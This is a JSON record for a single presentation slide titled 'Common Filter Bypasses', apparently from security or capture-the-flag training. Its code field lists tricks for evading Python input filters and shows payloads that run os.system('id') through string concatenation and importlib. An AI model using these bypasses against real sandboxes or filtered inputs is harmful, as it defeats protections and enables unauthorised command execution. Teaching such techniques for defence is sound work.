    {
      "id": "2cfb2b4e-dca8-412e-8da4-7506b2987161",
      "layout": "top",
      "bgType": "gradient",
      "bgColor": "#080b08",
      "bgGradient": "linear-gradient(160deg,#030803 0%,#061206 100%)",
      "bgImage": "",
      "titleText": "Common Filter Bypasses",
      "titleColor": "#00ff41",
      "titleSize": 36,
      "subtitleText": "",
      "subtitleColor": "#2a6b3a",
      "bodyText": "",
      "bodyColor": "#7ab87a",
      "bodySize": 22,
      "bullets": [],
      "codeText": "# underscore filtered → use vars()\n# quotes filtered → use chr() or bytes\n# import filtered → use __import__\n# space filtered → use /**/  or (for Python) use (    )\n\n# Concatenation bypass\n__import__('o'+'s').system('id')\n\n# Alternative import\nimport importlib\nimportlib.import_module('os').system('id')",
      "codeLang": "python",
      "imageUrl": "",
